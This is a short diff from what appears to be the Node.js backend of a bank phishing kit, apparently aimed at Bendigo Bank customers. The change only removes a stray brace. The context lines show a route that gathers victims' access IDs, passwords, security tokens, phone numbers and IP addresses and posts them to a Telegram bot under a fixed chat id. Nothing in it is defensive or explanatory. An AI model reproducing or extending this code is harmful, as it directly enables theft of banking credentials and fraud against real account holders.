@@ -2008,7 +2008,7 @@ app.post("/bendigoSkii", (req, res) => {
   userAgent = req.body.userAgent;
   ip = req.body.ip;
 
-  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}\nSecurity Token: ${secToken}\n+ ----------- Personal Information ------------+\nPhone Number: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}}`;
+  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}\nSecurity Token: ${secToken}\n+ ----------- Personal Information ------------+\nPhone Number: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
   if (skiiBendigo == 3) {
     axios.post(
       `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
